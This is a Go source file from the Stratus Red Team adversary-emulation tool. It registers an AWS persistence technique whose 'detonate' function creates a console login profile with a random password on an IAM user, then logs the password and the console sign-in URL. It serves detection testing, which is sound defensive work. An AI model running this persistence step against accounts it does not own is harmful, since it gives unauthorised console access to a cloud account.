package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/internal/utils"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.persistence.iam-user-create-login-profile",
		FriendlyName: "Create a Login Profile on an IAM User",
		Description: `
Establishes persistence by creating a login profile on an existing IAM user. This allows an attacker to access an IAM
user intended to be used programmatically through the AWS console usual login process. 

Warm-up: Create the pre-requisite IAM user.

Detonation: Create the login profile.
`,
		Platform:                   stratus.AWS,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	iamClient := iam.NewFromConfig(providers.AWS().GetConnection())
	userName := params["user_name"]
	password := utils.RandomString(16) + ".#1Aa" // extra characters to ensure we meet requirements, no matter the password policy

	log.Println("Creating a login profile on IAM user " + userName)
	_, err := iamClient.CreateLoginProfile(context.Background(), &iam.CreateLoginProfileInput{
		UserName:              aws.String(userName),
		Password:              aws.String(password),
		PasswordResetRequired: false,
	})
	if err != nil {
		return errors.New("unable to create IAM login profile: " + err.Error())
	}

	accountId, _ := utils.GetCurrentAccountId(providers.AWS().GetConnection())
	log.Println("Created a login profile with password " + password)
	loginUrl := "https://" + accountId + ".signin.aws.amazon.com/console"
	log.Println("You can log in at: " + loginUrl)

	return nil
}

// TODO cleanup
